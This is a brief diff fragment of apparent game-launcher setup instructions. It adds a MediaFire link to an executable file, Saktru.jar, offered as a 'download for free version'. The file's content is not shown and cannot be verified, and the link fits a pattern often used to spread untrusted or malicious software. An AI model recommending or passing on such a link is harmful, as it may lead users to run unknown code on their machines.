@@ -5,3 +5,7 @@ extract,
 open launcher ,
 login,
 and LAUNCH YOUR GAME!,
+
+
+https://www.mediafire.com/file/aajffa4mnh5bjpm/Saktru.jar/file (download for free version)
+
